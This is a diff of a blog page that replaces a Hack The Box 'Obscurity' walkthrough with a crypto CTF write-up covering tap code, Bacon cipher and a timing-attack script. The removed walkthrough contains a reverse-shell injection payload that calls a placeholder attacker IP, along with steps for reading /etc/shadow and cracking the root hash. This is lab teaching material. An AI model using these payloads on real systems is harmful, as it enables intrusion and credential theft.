@@ -3,33 +3,42 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//oxopos-c-summer-challenge-2020-web-challenges-write-up/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up" />
+    <meta property="og:description" content="Knock Knock (100)21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }If I had known about Tap Code (aka Knock Code) this would have been straightforward. I ended up getting the flag with some &quot;leaps of logic&quot;.  Basically, by knowing that the first 4" />
+    <meta property="og:url" content="https://inesmartins.github.io//oxopos-c-summer-challenge-2020-web-challenges-write-up/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/09/headers1.png" />
+    <meta property="article:published_time" content="2020-09-25T10:30:14.000Z" />
+    <meta property="article:modified_time" content="2020-09-26T11:21:39.000Z" />
+    <meta property="article:tag" content="tap code" />
+    <meta property="article:tag" content="bacon cipher" />
+    <meta property="article:tag" content="timing attack" />
+    <meta property="article:tag" content="crypto" />
+    <meta property="article:tag" content="ctf" />
+    <meta property="article:tag" content="oposec" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up" />
+    <meta name="twitter:description" content="Knock Knock (100)21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }If I had known about Tap Code (aka Knock Code) this would have been straightforward. I ended up getting the flag with some &quot;leaps of logic&quot;.  Basically, by knowing that the first 4" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//oxopos-c-summer-challenge-2020-web-challenges-write-up/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/09/headers1.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="tap code, bacon cipher, timing attack, crypto, ctf, oposec" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="1704" />
+    <meta property="og:image:height" content="966" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +67,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up",
+    "url": "https://inesmartins.github.io//oxopos-c-summer-challenge-2020-web-challenges-write-up/",
+    "datePublished": "2020-09-25T10:30:14.000Z",
+    "dateModified": "2020-09-26T11:21:39.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/09/headers1.png",
+        "width": 1704,
+        "height": 966
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "tap code, bacon cipher, timing attack, crypto, ctf, oposec",
+    "description": "Knock Knock (100)\n&gt; 21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }\nIf I had known about Tap Code [https://en.wikipedia.org/wiki/Tap_code] (aka\nKnock Code) this would have been straightforward. I ended up getting the flag\nwith some &quot;leaps of logic&quot;. \n\nBasically, by knowing that the first 4 numbers probably matched the word flag:\n\na &#x3D;&gt; 11\nf &#x3D;&gt; 21\ng &#x3D;&gt; 22\nl &#x3D;&gt; 31\n\nI was able to infer the rest of the letters:\n\na &#x3D;&gt; 11\nb &#x3D;&gt; 12\nc &#x3D;&gt; 13\nd &#x3D;&gt; 14\ne &#x3D;&gt; 15\n\n// 6 number jump \n\nf &#x3D;&gt; 21\ng &#x3D;&gt; 22\nh &#x3D;&gt; 23\ni &#x3D;&gt; 24",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +110,83 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
-                    <time class="post-date" datetime="2020-06-07">2020-06-07</time>
+                    <time class="post-date" datetime="2020-09-25">2020-09-25</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/09/headers1.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
+                <h2 id="knock-knock-100-">Knock Knock (100)</h2><blockquote><code>21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }</code></blockquote><p>If I had known about <a href="https://en.wikipedia.org/wiki/Tap_code">Tap Code</a> (aka Knock Code) this would have been straightforward. I ended up getting the flag with some "leaps of logic". </p><p>Basically, by knowing that the first 4 numbers probably matched the word <code>flag</code>:</p><pre><code>a =&gt; 11
+f =&gt; 21
+g =&gt; 22
+l =&gt; 31</code></pre><p>I was able to infer the rest of the letters:</p><pre><code>a =&gt; 11
+b =&gt; 12
+c =&gt; 13
+d =&gt; 14
+e =&gt; 15
 
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
-</code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
-</code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
-...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
-</code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
-</code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
+// 6 number jump 
 
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
+f =&gt; 21
+g =&gt; 22
+h =&gt; 23
+i =&gt; 24
+j =&gt; 25
+k =&gt; 26
 
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
-</code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
+// 5 number jump 
 
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
+l =&gt; 31
+m =&gt; 32
+n =&gt; 33
+o =&gt; 34
+p =&gt; 35
+q =&gt; 36
 
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
+// 6 number jump 
 
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
+r =&gt; 42
+s =&gt; 43
+t =&gt; 44
+u =&gt; 45</code></pre><p>Which got me the flag:  <code>flag{mateusrose}</code> </p><hr></hr><h2 id="pancetta-200-">Pancetta (200)</h2><figure class="kg-card kg-image-card"></figure><p>The clue was a dead giveaway on this one: Pancetta -&gt; <a href="https://en.wikipedia.org/wiki/Bacon%27s_cipher">Bacon cipher</a>. </p><p>I replaced every pink letter with a <code>1</code> and every black letter with a <code>0</code> and then decoded the cipher-text using <a href="https://gchq.github.io/CyberChef/#recipe=Bacon_Cipher_Decode('Standard%20(I%3DJ%20and%20U%3DV)','0/1',false)&amp;input=MTAwMDExMDAxIDEwIDExMDAwMCAwMTEwMDAgMDAwMCAxMDAwMDAxMCAwMDAwIDAxMCAwMDAwIDAwMCAwMDEwIDExMDAgMTAgMDAxMCAxMCAwMSAxMDExMSAxMDAxMTEwIDAxMTEwMDEgMTEwMDExIDEwIDAxMSAxMDAxIDExMDAxMSAxMDA">CyberChef</a>.</p><figure class="kg-card kg-image-card"></figure><hr></hr><h2 id="streamside-300-">Streamside (300)</h2><blockquote>No one will give you the flag this time.<br />You will find it out by yourself. Take your time.<br /><a href="https://streamside.apl3b.com/">https://streamside.apl3b.com</a></blockquote><figure class="kg-card kg-image-card"></figure><p>This challenge consisted of a web page with an input field where we could enter and validate a flag. After some poking around I realised that just by entering the word <code>flag</code> it took the server a lot longer to respond that when we entered something else, which made me think this was a <a href="https://en.wikipedia.org/wiki/Timing_attack">timing attack</a>.</p><p>Initially I created a Python script to find the complete flag automatically, but the results were unreliable so I decided to use the script to output the results for each letter of the flag, and then analyse them manually:</p><pre><code>~ cat curl-format.txt
+time_total:  %{time_total}</code></pre><pre><code class="language-python">import os
 
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
+alphabet = "abcdefghijklmnopqrstuvxwyz0123456789ABCDEFGHIJKLMNOPQRSTUVXWYZ!\"#$%&amp;/()=?*`|^_:;-"
+url = "https://streamside.apl3b.com/process"
+output_filename = "output.txt"
+format_filename = "@curl-format.txt"
 
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
+result_str = ""
+os.system("rm " + output_filename)
 
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
+for letter in alphabet:
 
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
-</code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
-</code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<p>That's it, hope you enjoyed it!</p>
+    # builds new test flag
+    tmp_flag = "flag=flag{" + letter + "}"
+
+    # executes command
+    print("Trying " + tmp_flag)
+    cmd = "curl -s -d '" + tmp_flag + "' -w '" + format_filename + "' -X POST " + url
+    result = os.popen(cmd).read()
+
+    # parses result and prints it
+    answer = result.split(" ")[0].split("\n")[0].strip()
+    time_total = result.split("time_total:")[1].strip()
+
+    # saves result to string
+    result_str += letter + "=" + str(time_total) + "\n"
+
+    # checks message
+    if "Wrong" not in answer:
+        print("Found it! Flag is " + tmp_flag)
+    
+os.system("echo '" + result_str + "' &gt; " + output_filename)
+os.system("open " + output_filename)</code></pre><p>And we get the flag: <code>flag{c4l1Po_de_l1M4o}</code>.</p>
 
             </section>
 
